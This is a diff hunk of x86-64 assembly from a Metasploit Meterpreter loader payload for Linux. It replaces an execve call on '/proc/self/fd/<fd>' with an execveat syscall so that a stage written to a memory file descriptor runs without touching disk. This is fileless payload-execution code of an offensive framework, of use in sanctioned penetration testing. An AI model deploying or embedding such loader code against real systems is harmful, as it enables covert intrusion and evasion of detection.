@@ -22,32 +22,15 @@ module Msf::Payload::Linux::X64::MeterpreterLoader
       xor rax, rax
       inc rax
       syscall                            ; write(fd, elfbuffer, elfbuffer_len);
-      jmp get_command
-    got_command:
-      pop rbx
-      mov rcx, 18
-      mov rax, rdi
-    itoa:
-      test rax, rax
-      jz execve
-      mov rdx, 10
-      div dl
-      mov rdx, rax
-      shr rdx, 8
-      and rax, 255
-      add rdx, 48
-      mov byte [rbx + rcx], dl
-      dec rcx
-      jmp itoa
-    execve:
-      mov rdi, rbx
+    execveat:
       xor rdx, rdx
-      xor rsi, rsi
-      mov eax, 0x3b
-      syscall                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
-    get_command:
-      call got_command
-      db "/proc/self/fd//////", 0x00
+      xor r10, r10
+      xor r8, r8
+      mov r8, 0x1000
+      push r10
+      lea rsi, [rsp]
+      mov eax, 0x142
+      syscall                           ; execveat(fd,NULL, NULL, NULL);
     get_payload:
       call got_payload
     ^
